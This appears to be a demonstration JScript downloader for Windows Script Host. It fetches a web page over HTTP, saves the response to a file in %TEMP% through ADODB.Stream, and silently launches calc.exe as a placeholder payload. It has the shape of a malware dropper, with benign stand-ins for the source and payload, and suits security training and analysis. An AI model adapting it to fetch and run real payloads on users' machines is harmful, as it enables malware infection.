var ws = new ActiveXObject("WScript.Shell");
var fn = ws.ExpandEnvironmentStrings("%TEMP%") + "\\" + "abcdef.txt";
var xo = new ActiveXObject("MSXML2.XMLHTTP");
xo.onreadystatechange = function() {
  if (xo.readyState === 4) {
    var xa = new ActiveXObject("ADODB.Stream");
    xa.open();
    xa.type = 1;
    xa.write(xo.ResponseBody);
    xa.position = 0;
    xa.saveToFile(fn, 2);
    xa.close();
  };
};
try {
  xo.open("GET", "https://www.sans.org", false);
  xo.send();
  if (xo.responseText) {
  WScript.Echo("File downloaded and saved as " + fn);
  WScript.Echo("Executing calc.exe...");
     ws.Run("calc.exe", 0, 0);
  };
} catch (er) {};